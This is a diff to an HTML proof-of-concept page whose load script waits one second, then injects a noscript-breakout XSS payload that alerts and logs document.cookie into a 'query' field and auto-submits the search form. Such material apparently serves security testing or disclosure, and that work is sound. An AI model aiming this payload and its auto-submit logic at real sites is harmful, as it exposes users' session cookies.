@@ -12,24 +12,26 @@
 
       // Automatically fill the vulnerable input field and search for submit button
       window.onload = function () {
-        // find the input field
-        var inputField = document.querySelector('input[name="query"]');
-        if (inputField) {
-          // Insert payload to the text box
-          inputField.value =
-            "</noscript><script>alert(document.cookie);console.log(document.cookie)<\/script>";
+        setTimeout(function () {
+          // find the input field
+          var inputField = document.querySelector('input[name="query"]');
+          if (inputField) {
+            // Insert payload to the text box
+            inputField.value =
+              "</noscript><script>alert(document.cookie);console.log(document.cookie)<\/script>";
 
-          // Find and click the submit button to submit the form
-          var submitButton = document.querySelector("submit#Search");
-          if (submitButton) {
-            // Simulate click on submit button
-            submitButton.click();
+            // Find and click the submit button to submit the form
+            var submitButton = document.querySelector("submit#Search");
+            if (submitButton) {
+              // Simulate click on submit button
+              submitButton.click();
+            } else {
+              console.error("Submit button not found");
+            }
           } else {
-            console.error("Submit button not found");
+            console.error("Vulnerable input field not found.");
           }
-        } else {
-          console.error("Vulnerable input field not found.");
-        }
+        }, 1000);
       };
     </script>
   </body>
